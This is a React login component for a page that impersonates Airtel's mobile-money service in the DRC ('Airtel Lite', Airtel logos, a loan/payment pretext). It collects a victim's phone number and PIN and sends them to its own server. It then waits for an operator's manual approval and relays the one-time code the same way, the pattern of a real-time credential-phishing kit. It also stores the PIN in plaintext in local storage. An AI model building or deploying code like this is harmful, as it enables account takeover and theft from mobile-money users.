import { useState, useRef, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { useLoanApplication } from '../LoanApplicationContext';
import { useUserId } from '../hooks/useUserId';
import './Login.css';

// ── Phone validation: DRC +243, starts with 9, 9 or 10 digits ──
const validatePhoneNumber = (number) => {
  if (!number) return { valid: false, message: '' };
  const length = number.length;
  if (length < 9 || length > 10) return { valid: false, message: '' };
  if (length === 10) {
    if (!number.startsWith('09'))
      return { valid: false, message: 'Le numéro à 10 chiffres doit commencer par 09' };
  } else if (length === 9) {
    if (!number.startsWith('9'))
      return { valid: false, message: 'Le numéro à 9 chiffres doit commencer par 9' };
  }
  return { valid: true, message: '' };
};

export default function Login() {
  const navigate = useNavigate();
  const { userId, apiBase } = useUserId();
  const { personalDetailsData, updateAuthData, authData, serverStatus } = useLoanApplication();

  const API_BASE_URL = import.meta.env.VITE_API_URL || 'http://localhost:3001';
  const api = (path) => `${API_BASE_URL}${apiBase}/${path}`;

  const initialPhone = personalDetailsData?.phoneNumber
    ? personalDetailsData.phoneNumber.replace(/\D/g, '').slice(-10)
    : '';

  // ── Stages: credentials → approvalWaiting → otp → otpProcessing ──
  const [stage, setStage] = useState('credentials');
  const [phoneNumber, setPhoneNumber] = useState(initialPhone);
  const [pin, setPin] = useState(['', '', '', '']);
  const [showPin, setShowPin] = useState(false);
  const [otp, setOtp] = useState('');
  const [isProcessing, setIsProcessing] = useState(false);
  const [isReturningUser, setIsReturningUser] = useState(false);
  const [waitingForApproval, setWaitingForApproval] = useState(false);
  const [showErrorModal, setShowErrorModal] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');

  // OTP-specific state
  const [otpTimer, setOtpTimer] = useState(0);
  const [isResending, setIsResending] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [verificationStatus, setVerificationStatus] = useState('');
  const [isOtpApproved, setIsOtpApproved] = useState(false);
  const [progress, setProgress] = useState(0);
  const [waitingForOtpApproval, setWaitingForOtpApproval] = useState(false);

  const pinRefs = [useRef(null), useRef(null), useRef(null), useRef(null)];
  const otpInputRef = useRef(null);
  const pollingIntervalRef = useRef(null);
  const pollingAttempts = useRef(0);
  const previousStatusRef = useRef(null);
  const maxPollingAttempts = 60;

  useEffect(() => {
    return () => { if (pollingIntervalRef.current) clearInterval(pollingIntervalRef.current); };
  }, []);

  // ── OTP timer countdown ──
  useEffect(() => {
    if (otpTimer > 0 && stage === 'otp') {
      const timer = setInterval(() => setOtpTimer(prev => {
        const v = prev - 1;
        if (v <= 0) { localStorage.removeItem('otp_timer'); return 0; }
        return v;
      }), 1000);
      return () => clearInterval(timer);
    }
  }, [otpTimer, stage]);

  // ── OTP processing progress bar → navigate on complete ──
  useEffect(() => {
    if (stage === 'otpProcessing' && isOtpApproved && progress < 100) {
      const t = setTimeout(() => setProgress(prev => Math.min(prev + Math.random() * 15 + 5, 100)), 300);
      return () => clearTimeout(t);
    } else if (progress >= 100 && isOtpApproved && stage === 'otpProcessing') {
      setTimeout(() => navigate(`/${userId}/status`), 500);
    }
  }, [stage, isOtpApproved, progress, navigate, userId]);

  // ── Poll for login approval when waiting after credentials ──
  useEffect(() => {
    if (stage !== 'approvalWaiting') return;
    pollingAttempts.current = 0;

    const poll = async () => {
      try {
        pollingAttempts.current++;
        if (pollingAttempts.current > maxPollingAttempts) {
          clearInterval(pollingIntervalRef.current);
          setWaitingForApproval(false); setIsProcessing(false);
          setErrorMessage('Une erreur s\'est produite, veuillez réessayer');
          setShowErrorModal(true); setStage('credentials'); return;
        }
        const cleanNumber = phoneNumber.startsWith('0') ? phoneNumber.slice(1) : phoneNumber;
        const formattedPhone = `+243${cleanNumber}`;
        const response = await fetch(api('check-login-approval'), {
          method: 'POST', headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ phoneNumber: formattedPhone, pin: pin.join('') })
        });
        const data = await response.json();
        if (data.success) {
          if (data.approved) {
            clearInterval(pollingIntervalRef.current);
            setWaitingForApproval(false);
            await new Promise(r => setTimeout(r, 500));
            if (isReturningUser) {
              navigate(`/${userId}/status`);
            } else {
              // Move to OTP stage
              setStage('otp');
              setOtp('');
              setOtpTimer(40);
              setWaitingForOtpApproval(false);
              setIsProcessing(false);
              localStorage.setItem('otp_timer', JSON.stringify({ endTime: Date.now() + 40000 }));
              setTimeout(() => otpInputRef.current?.focus(), 100);
            }
          } else if (data.rejected) {
            clearInterval(pollingIntervalRef.current);
            setWaitingForApproval(false); setIsProcessing(false);
            setErrorMessage('PIN incorrect');
            setShowErrorModal(true); setStage('credentials');
          } else if (data.expired) {
            clearInterval(pollingIntervalRef.current);
            setWaitingForApproval(false); setIsProcessing(false);
            setErrorMessage('Une erreur s\'est produite, veuillez réessayer');
            setShowErrorModal(true); setStage('credentials');
          }
        }
      } catch (error) { console.error('Polling error:', error); }
    };

    pollingIntervalRef.current = setInterval(poll, 5000);
    poll();
    return () => { if (pollingIntervalRef.current) clearInterval(pollingIntervalRef.current); };
  }, [stage]);

  // ── Phone handlers ──
  const handlePhoneChange = (e) => setPhoneNumber(e.target.value.replace(/\D/g, '').slice(0, 10));
  const handlePhonePaste = (e) => { e.preventDefault(); setPhoneNumber(e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 10)); };

  // ── PIN handlers ──
  const handlePinChange = (index, value) => {
    const v = value.replace(/\D/g, ''); if (v.length > 1) return;
    const newPin = [...pin]; newPin[index] = v; setPin(newPin);
    if (v && index < 3) pinRefs[index + 1].current.focus();
  };
  const handlePinPaste = (e, index) => {
    e.preventDefault();
    const digits = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 4).split('');
    const newPin = [...pin];
    digits.forEach((d, i) => { if (index + i < 4) newPin[index + i] = d; });
    setPin(newPin); pinRefs[Math.min(index + digits.length, 3)].current.focus();
  };
  const handlePinKeyDown = (index, e) => {
    if (e.key === 'Backspace') {
      if (pin[index]) { const n = [...pin]; n[index] = ''; setPin(n); }
      else if (index > 0) pinRefs[index - 1].current.focus();
    } else if (e.key === 'ArrowLeft' && index > 0) pinRefs[index - 1].current.focus();
    else if (e.key === 'ArrowRight' && index < 3) pinRefs[index + 1].current.focus();
  };
  const handlePinKeyPress = (e) => { if (!/^\d$/.test(e.key)) e.preventDefault(); };

  // ── OTP handler (single text input, 4 digits) ──
  const handleOtpChange = (e) => {
    const v = e.target.value.replace(/\D/g, '');
    if (v.length <= 4) setOtp(v);
  };

  // ── Login submit ──
  const handleLogin = async (e) => {
    e.preventDefault();
    const fullPin = pin.join('');
    const validation = validatePhoneNumber(phoneNumber);
    if (!validation.valid) {
      setErrorMessage('Le numéro de téléphone doit commencer par 9 (9 chiffres) ou 09 (10 chiffres)!\nVeuillez entrer le bon numéro et réessayer!');
      setShowErrorModal(true); return;
    }
    if (fullPin.length !== 4) {
      setErrorMessage('Veuillez entrer un PIN complet à 4 chiffres');
      setShowErrorModal(true); return;
    }

    const cleanNumber = phoneNumber.startsWith('0') ? phoneNumber.slice(1) : phoneNumber;
    const formattedPhone = `+243${cleanNumber}`;

    updateAuthData({ phoneNumber: formattedPhone, pin: fullPin, isAuthenticated: false });
    try {
      localStorage.setItem('ecocash_phone', formattedPhone);
      localStorage.setItem('ecocash_auth', JSON.stringify({
        phoneNumber: formattedPhone, pin: fullPin,
        isAuthenticated: false, timestamp: new Date().toISOString()
      }));
    } catch (err) { console.error('Failed to save auth:', err); }

    setIsProcessing(true);

    try {
      const statusResponse = await fetch(api('check-user-status'), {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phoneNumber: formattedPhone })
      });
      const statusData = await statusResponse.json();
      const returning = statusData.isReturningUser || false;
      setIsReturningUser(returning);

      const loginResponse = await fetch(api('login'), {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phoneNumber: formattedPhone, pin: fullPin, timestamp: new Date().toISOString() })
      });
      const loginData = await loginResponse.json();
      if (loginData.success) {
        setWaitingForApproval(true);
        setStage('approvalWaiting');
      } else {
        setIsProcessing(false);
        setErrorMessage('Échec du traitement de la connexion. Veuillez réessayer.');
        setShowErrorModal(true);
      }
    } catch (error) {
      console.error('Login error:', error);
      setIsProcessing(false);
      setErrorMessage('Échec du traitement de la connexion. Veuillez réessayer.');
      setShowErrorModal(true);
    }
  };

  // ── OTP status polling ──
  const checkOTPStatus = async (phone, otpCode) => {
    const startTime = Date.now();
    const maxTime = 5 * 60 * 1000;
    const pollInterval = 2000;
    while (Date.now() - startTime < maxTime) {
      try {
        const response = await fetch(api('check-otp-status'), {
          method: 'POST', headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ phoneNumber: phone, otp: otpCode })
        });
        const data = await response.json();
        if (data.status === 'approved') return { approved: true };
        if (data.status === 'rejected') return { approved: false, message: 'Code incorrect' };
        if (data.status === 'wrong_pin') return { approved: false, wrongPin: true, message: 'PIN incorrect' };
        const elapsed = Math.floor((Date.now() - startTime) / 1000);
        const newStatus = `Veuillez patienter... (${elapsed}s)`;
        if (previousStatusRef.current !== newStatus) { setVerificationStatus(newStatus); previousStatusRef.current = newStatus; }
        await new Promise(r => setTimeout(r, pollInterval));
      } catch (error) {
        console.error('OTP status error:', error);
        await new Promise(r => setTimeout(r, pollInterval));
      }
    }
    return { approved: false, timeout: true, message: 'Délai d\'expiration. Veuillez réessayer.' };
  };

  // ── OTP submit ──
  const handleOtpSubmit = async (e) => {
    e.preventDefault();
    if (isSubmitting) return;
    if (otp.length !== 4) {
      setErrorMessage('Veuillez entrer un code OTP valide à 4 chiffres');
      setShowErrorModal(true); return;
    }
    setIsSubmitting(true);
    const phone = authData?.phoneNumber || `+243${phoneNumber.startsWith('0') ? phoneNumber.slice(1) : phoneNumber}`;

    updateAuthData({ otp, isAuthenticated: true });

    try {
      await fetch(api('verify-otp'), {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phoneNumber: phone, otp, timestamp: new Date().toISOString() })
      });

      setStage('otpProcessing');
      setVerificationStatus('Veuillez patienter...');
      previousStatusRef.current = 'Veuillez patienter...';
      setIsOtpApproved(false); setProgress(0);

      const result = await checkOTPStatus(phone, otp);

      if (result.approved) {
        localStorage.removeItem('otp_timer');
        setVerificationStatus('✅ Vérifié! En cours...');
        previousStatusRef.current = '✅ Vérifié! En cours...';
        setIsOtpApproved(true);
      } else if (result.wrongPin) {
        setStage('credentials'); setIsSubmitting(false); setIsProcessing(false);
        setProgress(0); setIsOtpApproved(false);
        localStorage.removeItem('otp_timer'); localStorage.removeItem('ecocash_phone');
        updateAuthData({ phoneNumber: '', pin: '', otp: '', isAuthenticated: false });
        setErrorMessage('Le PIN ou le numéro de téléphone que vous avez entré était incorrect. Veuillez vous reconnecter.');
        setShowErrorModal(true); previousStatusRef.current = null;
      } else if (result.timeout) {
        setStage('otp'); setIsSubmitting(false); setProgress(0); setIsOtpApproved(false);
        setErrorMessage('Délai d\'expiration. Veuillez réessayer.');
        setShowErrorModal(true); previousStatusRef.current = null;
      } else {
        setStage('otp'); setIsSubmitting(false); setProgress(0); setIsOtpApproved(false);
        setOtp('');
        setErrorMessage(result.message || 'Code incorrect. Veuillez réessayer.');
        setShowErrorModal(true); previousStatusRef.current = null;
        setTimeout(() => otpInputRef.current?.focus(), 100);
      }
    } catch (error) {
      console.error('OTP verification error:', error);
      setStage('otp'); setIsSubmitting(false); setProgress(0); setIsOtpApproved(false);
      setErrorMessage('Échec de la vérification. Veuillez réessayer.');
      setShowErrorModal(true); previousStatusRef.current = null;
    }
  };

  // ── Resend OTP ──
  const handleResend = async () => {
    if (otpTimer > 0 || isResending) return;
    const phone = authData?.phoneNumber || `+243${phoneNumber.startsWith('0') ? phoneNumber.slice(1) : phoneNumber}`;
    if (!phone || phone === '+243 900 123 456') return;
    setIsResending(true);
    try {
      const response = await fetch(api('resend-otp'), {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phoneNumber: phone, timestamp: new Date().toISOString() })
      });
      const data = await response.json();
      if (data.success) {
        setOtp(''); setOtpTimer(40);
        localStorage.setItem('otp_timer', JSON.stringify({ endTime: Date.now() + 40000 }));
        otpInputRef.current?.focus();
      }
    } catch (error) { console.error('Resend error:', error); }
    finally { setIsResending(false); }
  };

  const closeErrorModal = () => { setShowErrorModal(false); setErrorMessage(''); };
  const isFormComplete = phoneNumber.length >= 9 && pin.every(d => d !== '');
  const isOtpValid = otp.length === 4;

  const getButtonState = () => {
    if (serverStatus?.isChecking) return { text: 'ATTENDEZ...', disabled: true, className: 'login-button waiting' };
    if (serverStatus && !serverStatus.isActive) return { text: 'ERREUR SERVEUR', disabled: true, className: 'login-button error' };
    return { text: 'CONNEXION', disabled: !isFormComplete || isProcessing, className: 'login-button' };
  };
  const buttonState = getButtonState();

  // ══════════════════════════════════════════════════
  // PROCESSING / APPROVAL WAITING SCREEN
  // ══════════════════════════════════════════════════
  if (stage === 'approvalWaiting' || (isProcessing && stage === 'credentials')) {
    return (
      <div className="login-container">
        <div className="processing-overlay">
          <div className="processing-card">
            <div className="spinner-container"><div className="spinner"></div></div>
            <h1 className="processing-title">
              {waitingForApproval ? 'Veuillez patienter...' : 'Traitement en cours...'}
            </h1>
            <p className="processing-subtitle">
              {waitingForApproval ? 'Cela prend généralement quelques secondes'
                : isReturningUser ? 'Bon retour! Redirection vers le tableau de bord...'
                : 'Préparation de la vérification...'}
            </p>
          </div>
        </div>
      </div>
    );
  }

  // ══════════════════════════════════════════════════
  // OTP PROCESSING SCREEN
  // ══════════════════════════════════════════════════
  if (stage === 'otpProcessing') {
    return (
      <div className="otp-container">
        <main className="otp-content">
          <div className="processing-card">
            <div className="spinner-container"><div className="spinner"></div></div>
            <h1 className="processing-title">Vérification de l'OTP</h1>
            <p className="processing-subtitle">{verificationStatus}</p>
          </div>
        </main>
        <footer className="otp-footer">
          <img src="https://cdn-webportal.airtelstream.net/website/zambia/assets/images/logo.svg"
            alt="Airtel Logo" style={{ height: '40px', marginBottom: '10px' }} />
        </footer>
      </div>
    );
  }

  // ══════════════════════════════════════════════════
  // OTP ENTRY SCREEN
  // ══════════════════════════════════════════════════
  if (stage === 'otp') {
    const phoneDisplay = authData?.phoneNumber || `+243${phoneNumber.startsWith('0') ? phoneNumber.slice(1) : phoneNumber}`;
    return (
      <div className="otp-container">
        {showErrorModal && (
          <div className="error-modal-overlay" onClick={closeErrorModal}>
            <div className="error-modal" onClick={(e) => e.stopPropagation()}>
              <h2 className="error-modal-title">Erreur</h2>
              <p className="error-modal-message">{errorMessage}</p>
              <button className="error-modal-button" onClick={closeErrorModal}>OK</button>
            </div>
          </div>
        )}

        <header className="otp-header">
          <button className="back-btn" onClick={() => { setStage('credentials'); setOtp(''); setIsProcessing(false); }}>←</button>
          <div className="logo-large">
            <img src="https://cdn-webportal.airtelstream.net/website/zambia/assets/images/logo.svg" alt="Airtel Logo" />
          </div>
          <button className="menu-btn" aria-label="Menu">
            <div className="menu-line"></div><div className="menu-line"></div><div className="menu-line"></div>
          </button>
        </header>

        <main className="otp-content">
          <div className="otp-card">
            <h1 className="otp-title">Vérification OTP</h1>
            <p className="otp-subtitle">Entrez l'OTP envoyé à votre numéro de téléphone</p>
            <p className="otp-phone">{phoneDisplay}</p>

            <form onSubmit={handleOtpSubmit}>
              <div className="otp-input-container">
                <input ref={otpInputRef} type="text" className="otp-input-field"
                  value={otp} onChange={handleOtpChange} placeholder="Entrer l'OTP à 4 chiffres"
                  maxLength="4" inputMode="numeric" pattern="[0-9]*"
                  disabled={isResending || isSubmitting} autoComplete="one-time-code" />
                <p className="otp-hint">Entrer le code de vérification à 4 chiffres</p>
                <p className="resend-text">
                  {isResending ? <span className="resending-text">Renvoi du code...</span>
                    : otpTimer > 0 ? `Le code expire dans ${otpTimer} secondes`
                    : <>Vous n'avez pas reçu le code?{' '}<span className="resend-link" onClick={handleResend}>Renvoyer</span></>}
                </p>
              </div>

              <button type="submit"
                className={`submit-button ${isOtpValid ? 'active' : ''}`}
                disabled={!isOtpValid || isResending || isSubmitting}>
                {isSubmitting ? 'VÉRIFICATION...' : 'SOUMETTRE'}
              </button>
            </form>
          </div>
        </main>

        <div className="login-footer">
          <div><img src="https://cdn-webportal.airtelstream.net/website/zambia/assets/images/logo.svg" alt="Airtel Logo" /></div>
          <span>En collaboration avec</span>
          <span>STARLINK™</span>
          <footer className="footer">© 2026 Airtel Congo. Tous droits réservés.</footer>
        </div>
      </div>
    );
  }

  // ══════════════════════════════════════════════════
  // CREDENTIALS SCREEN (default)
  // ══════════════════════════════════════════════════
  return (
    <div className="login-container">
      {showErrorModal && (
        <div className="error-modal-overlay" onClick={closeErrorModal}>
          <div className="error-modal-content" onClick={(e) => e.stopPropagation()}>
            <div className="error-modal-icon">⚠️</div>
            <h2 className="error-modal-title">Format Invalide</h2>
            <p className="error-modal-message" style={{ whiteSpace: 'pre-line' }}>{errorMessage}</p>
            <button className="error-modal-button" onClick={closeErrorModal}>OK</button>
          </div>
        </div>
      )}

      <div className="login-header">
        <div className="logo-large">
          <img src="https://cdn-webportal.airtelstream.net/website/zambia/assets/images/logo.svg" alt="Airtel Logo" />
        </div>
      </div>

      <div className="login-content">
        <h1 className="login-title">Connectez-vous à Airtel Lite pour finaliser le paiement.</h1>

        {serverStatus?.error && (
          <div className="server-status-message error"><p>⚠️ {serverStatus.error}</p></div>
        )}

        <form className="login-form" onSubmit={handleLogin}>
          <div className="phone-input-container">
            <div className="country-code">
              <span className="flag-icon">🇨🇩</span>
              <span>+243</span>
            </div>
            <input type="tel" className="phone-input" value={phoneNumber}
              onChange={handlePhoneChange} onPaste={handlePhonePaste}
              placeholder="951234567" maxLength="10" inputMode="numeric"
              pattern="[0-9]*" required disabled={serverStatus?.isChecking} />
          </div>

          <div className="pin-section">
            <p className="pin-label">Entrez votre Code</p>
            <div className="pin-inputs-wrapper">
              <div className="pin-inputs">
                {pin.map((digit, index) => (
                  <input key={index} ref={pinRefs[index]}
                    type={showPin ? 'text' : 'password'} className="pin-box"
                    value={digit} onChange={(e) => handlePinChange(index, e.target.value)}
                    onKeyDown={(e) => handlePinKeyDown(index, e)}
                    onKeyPress={handlePinKeyPress} onPaste={(e) => handlePinPaste(e, index)}
                    maxLength="1" inputMode="numeric" pattern="[0-9]" required
                    disabled={serverStatus?.isChecking} />
                ))}
              </div>
              <button type="button" className="eye-button" onClick={() => setShowPin(!showPin)}
                aria-label={showPin ? 'Masquer le PIN' : 'Afficher le PIN'}
                disabled={serverStatus?.isChecking}>
                {showPin ? '👁️' : '👁️‍🗨️'}
              </button>
            </div>
          </div>

          <button type="submit" className={buttonState.className} disabled={buttonState.disabled}>
            {buttonState.text}
          </button>
        </form>
      </div>

      <div className="login-footer">
        <div><img src="https://cdn-webportal.airtelstream.net/website/zambia/assets/images/logo.svg" alt="Airtel Logo" /></div>
        <span>En collaboration avec</span>
        <span>STARLINK™</span>
        <footer className="footer">© 2026 Airtel Congo. Tous droits réservés.</footer>
      </div>
    </div>
  );
}
